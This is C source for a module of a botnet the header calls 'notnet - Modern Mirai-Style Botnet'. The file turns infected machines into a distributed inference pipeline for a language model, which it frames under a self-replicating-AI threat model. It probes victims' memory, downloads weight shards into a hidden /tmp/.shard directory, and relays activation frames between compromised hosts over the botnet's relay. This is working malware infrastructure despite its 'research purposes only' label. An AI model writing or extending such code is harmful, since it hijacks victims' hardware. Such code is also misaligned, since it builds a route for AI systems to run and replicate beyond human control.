/*
 * notnet - Modern Mirai-Style Botnet
 * shard.c - Distributed-inference replication substrate (#402)
 *
 * Coordination + transport for turning the infected fleet into a
 * pipelined inference engine (Anthropic self-replicating-AI threat
 * model). See include/shard.h for the design + trust model. This file
 * is deliberately free of any neural-net math: it fetches/verifies
 * weight shards, forwards opaque activation frames over the relay,
 * and reports capacity + pipeline telemetry. The sim emulates the
 * forward; a real runner would be a remote plugin.
 *
 * Research purposes only.
 */
#include "shard.h"
#include "relay.h"
#include "arch_detect.h"
#include "util.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <unistd.h>
#include <errno.h>
#include <sys/stat.h>
#include <pthread.h>

static pthread_mutex_t g_shard_mutex = PTHREAD_MUTEX_INITIALIZER;
static shard_assignment_t g_asg;
static int g_have_asg = 0;
static int g_fleet_tps = 0;   /* x100 tok/s, operator-fed */

/* ── Capacity probe ──────────────────────────────────────────── */
/* RAM from /proc/meminfo MemTotal (kB -> MB). 0 when unreadable
 * (non-Linux, or /proc not mounted) — callers treat 0 as "unknown"
 * and refuse to plan a shard rather than guessing. */
static uint32_t probe_ram_mb(void) {
    FILE *f = fopen("/proc/meminfo", "r");
    if (!f) return 0;
    char line[256];
    uint32_t mb = 0;
    while (fgets(line, sizeof(line), f)) {
        unsigned long kb = 0;
        if (sscanf(line, "MemTotal: %lu kB", &kb) == 1) {
            mb = (uint32_t)(kb / 1024);
            break;
        }
    }
    fclose(f);
    return mb;
}

void shard_probe_capacity(shard_capacity_t *cap, uint32_t layer_mb,
                          uint16_t total_layers) {
    if (!cap) return;
    memset(cap, 0, sizeof(*cap));
    cap->ram_mb = probe_ram_mb();
    /* arch of THIS host: loopback probe. arch_detect fingerprints a
     * remote target; for self we use a cheap uname-independent path —
     * the TTL/banner heuristic does not apply to localhost, so we
     * leave arch UNKNOWN unless the caller passed a hint. The sim and
     * tests set it explicitly. */
    snprintf(cap->arch, sizeof(cap->arch), "%s", ARCH_UNKNOWN);
    /* Derive how many layers this box can hold: reserve 128MB for the
     * runtime + activations, divide the rest by the per-layer size.
     * layer_mb==0 (unconfigured) -> cannot plan, 0 shard layers. */
    if (layer_mb > 0 && cap->ram_mb > 128) {
        uint32_t usable = cap->ram_mb - 128;
        uint32_t layers = usable / layer_mb;
        if (layers > total_layers) layers = total_layers;
        if (layers > SHARD_LAYER_MAX) layers = SHARD_LAYER_MAX;
        cap->shard_layers = layers;
    }
}

/* ── Assignment store ────────────────────────────────────────── */
void shard_set_assignment(const shard_assignment_t *asg) {
    if (!asg) return;
    pthread_mutex_lock(&g_shard_mutex);
    g_asg = *asg;
    g_have_asg = 1;
    pthread_mutex_unlock(&g_shard_mutex);
}

int shard_get_assignment(shard_assignment_t *out) {
    if (!out) return -1;
    pthread_mutex_lock(&g_shard_mutex);
    if (!g_have_asg) { pthread_mutex_unlock(&g_shard_mutex); return -1; }
    *out = g_asg;
    pthread_mutex_unlock(&g_shard_mutex);
    return 0;
}

int shard_have_assignment(void) {
    pthread_mutex_lock(&g_shard_mutex);
    int h = g_have_asg;
    pthread_mutex_unlock(&g_shard_mutex);
    return h;
}

/* ── Weight-shard fetch + verify ─────────────────────────────── */
/* The shard file name is deterministic from the assignment so the
 * operator can publish one pin per shard. We build the URL
 * <shard_url>/<name>, download via the capped helper (aborts on
 * oversize), then verify the whole file against cfg->shard_sha.
 * Fail-closed on every step; a partial/mismatched file is unlinked. */
int shard_fetch(notnet_bot_t *bot, const shard_cfg_t *cfg,
                const shard_assignment_t *asg) {
    if (!bot || !cfg || !asg || !cfg->enabled) return -1;
    if (cfg->shard_sha[0] == '\0' || strlen(cfg->shard_sha) != 64) {
        log_error("SHARD: no/invalid shard_sha256 pin — refusing fetch (fail-closed)");
        return -1;
    }
    if (asg->layer_count == 0) {
        log_warn("SHARD: assignment has 0 layers — nothing to fetch");
        return -1;
    }

    char name[128];
    int nn = snprintf(name, sizeof(name), "%s.layers%u-%u.bin",
                      asg->model[0] ? asg->model : "model",
                      asg->layer_start,
                      (unsigned)asg->layer_start + asg->layer_count - 1);
    if (nn < 0 || (size_t)nn >= sizeof(name)) return -1;

    /* ensure the shard dir exists */
    mkdir(cfg->shard_dir[0] ? cfg->shard_dir : "/tmp/.shard", 0700);

    char dest[320];
    snprintf(dest, sizeof(dest), "%s/%s",
             cfg->shard_dir[0] ? cfg->shard_dir : "/tmp/.shard", name);

    char url[SHARD_URL_MAX + 160];
    int un = snprintf(url, sizeof(url), "%s/%s",
                      cfg->shard_url[0] ? cfg->shard_url : "", name);
    if (un < 0 || (size_t)un >= sizeof(url)) return -1;

    /* download (capped). Weight shards for a <30B 4-bit model are a
     * few hundred MB at most; cap generously but bounded so a hostile
     * URL cannot fill the disk before the hash gate. */
    const long SHARD_MAX_BYTES = 512L * 1024 * 1024;
    if (http_download_max(bot, url, dest, SHARD_MAX_BYTES) < 0) {
        log_error("SHARD: download failed for %s", url);
        unlink(dest);
        return -1;
    }

    /* verify the whole file against the pin */
    unsigned char *data = NULL;
    long dlen = file_read_max(dest, &data, SHARD_MAX_BYTES);
    if (dlen <= 0 || !data) {
        log_error("SHARD: read-back failed for %s", dest);
        unlink(dest);
        return -1;
    }
    char actual[65];
    int hr = sha256_hex(data, (size_t)dlen, actual);
    free(data);
    if (hr != 0 || strcmp(actual, cfg->shard_sha) != 0) {
        log_error("SHARD: SHA-256 mismatch for %s — expected %.16s… got %.16s… (unlinked)",
                  dest, cfg->shard_sha, actual[0] ? actual : "(hash failed)");
        unlink(dest);
        return -1;
    }

    log_info("SHARD: %s fetched + verified (layers %u-%u, %ld bytes)",
             name, asg->layer_start,
             (unsigned)asg->layer_start + asg->layer_count - 1, dlen);
    return 0;
}

/* ── Activation forward over the relay ───────────────────────── */
/* Forward one opaque activation frame to the next pipeline peer. We
 * reuse relay_connect(): it dials the peer's relay listener, sends
 * `RELAY <token> <target> <port>`, and returns a tunnel socket. For
 * shard traffic the "target" is the peer's OWN activation listener
 * (relay_port), so the frame lands on the next shard holder. The
 * relay splices our bytes verbatim — activation tensors ride the same
 * token-authenticated transport as everything else. */

/* The bot pointer (for the relay token) is bound once at boot via
 * shard_bind_bot(); forward refuses when unbound (fail-closed). */
static notnet_bot_t *g_shard_bot = NULL;
void shard_bind_bot(notnet_bot_t *bot) { g_shard_bot = bot; }

int shard_forward(const shard_assignment_t *asg, const void *frame,
                  size_t len) {
    if (!asg || !frame || len == 0) return -1;
    /* last peer runs the LM head locally — nothing to forward */
    if (asg->my_index < 0 || asg->my_index >= asg->peer_count - 1)
        return -1;
    const char *next = asg->peers[asg->my_index + 1];
    if (next[0] == '\0') return -1;

    /* split host:port */
    char host[256];
    uint16_t port = 0;
    const char *colon = strrchr(next, ':');
    if (!colon) return -1;
    size_t hl = (size_t)(colon - next);
    if (hl >= sizeof(host)) return -1;
    memcpy(host, next, hl);
    host[hl] = '\0';
    port = (uint16_t)atoi(colon + 1);
    if (port == 0) return -1;

    if (!g_shard_bot || g_shard_bot->relay_token[0] == '\0') {
        log_warn("SHARD: forward refused — no relay token (fail-closed)");
        return -1;
    }

    /* Dial the next peer's activation listener THROUGH its relay. The
     * relay target is the peer itself on its relay_port; the frame is
     * written straight onto the tunnel. */
    int fd = relay_connect(g_shard_bot, host, port, host, port);
    if (fd < 0) {
        log_warn("SHARD: forward to %s failed (relay connect)", next);
        return -1;
    }
    size_t sent = 0;
    const char *p = (const char *)frame;
    while (sent < len) {
        ssize_t w = send(fd, p + sent, len - sent, 0);
        if (w <= 0) { close(fd); return -1; }
        sent += (size_t)w;
    }
    close(fd);
    return 0;
}

/* ── Telemetry ───────────────────────────────────────────────── */
void shard_status_render(const shard_cfg_t *cfg,
                         const shard_assignment_t *asg,
                         const shard_capacity_t *cap, char *buf, size_t len) {
    if (!buf || len == 0) return;
    buf[0] = '\0';
    if (!cfg || !cfg->enabled) return;
    char model[SHARD_MODEL_NAME_MAX] = "?";
    int ls = -1, lc = 0, idx = -1, peers = 0;
    if (asg && shard_have_assignment()) {
        snprintf(model, sizeof(model), "%s", asg->model);
        ls = asg->layer_start; lc = asg->layer_count;
        idx = asg->my_index; peers = asg->peer_count;
    }
    uint32_t ram = cap ? cap->ram_mb : 0;
    const char *arch = (cap && cap->arch[0]) ? cap->arch : ARCH_UNKNOWN;
    uint32_t tps = (cfg->tok_per_sec) ? cfg->tok_per_sec : (cap ? cap->tok_per_sec : 0);
    snprintf(buf, len,
             "model=%s;layers=%d+%d;idx=%d/%d;peers=%d;ram=%uMB;arch=%s;tok=%u.%02u",
             model, ls, lc, idx, peers, peers, ram, arch,
             tps / 100, tps % 100);
}

void shard_update_fleet_tps(int peers, uint32_t tok_per_sec_x100) {
    pthread_mutex_lock(&g_shard_mutex);
    if (peers <= 0 || tok_per_sec_x100 == 0) { g_fleet_tps = 0; }
    else {
        /* pipeline throughput is bounded by the slowest shard, so the
         * fleet rate is roughly one shard's rate, not the sum — but we
         * report the summed capacity as an upper bound and label it as
         * such in the README. */
        long total = (long)peers * tok_per_sec_x100;
        if (total > 2000000000L) total = 2000000000L;
        g_fleet_tps = (int)total;
    }
    pthread_mutex_unlock(&g_shard_mutex);
}

int shard_fleet_tps_x100(void) {
    pthread_mutex_lock(&g_shard_mutex);
    int t = g_fleet_tps;
    pthread_mutex_unlock(&g_shard_mutex);
    return t;
}
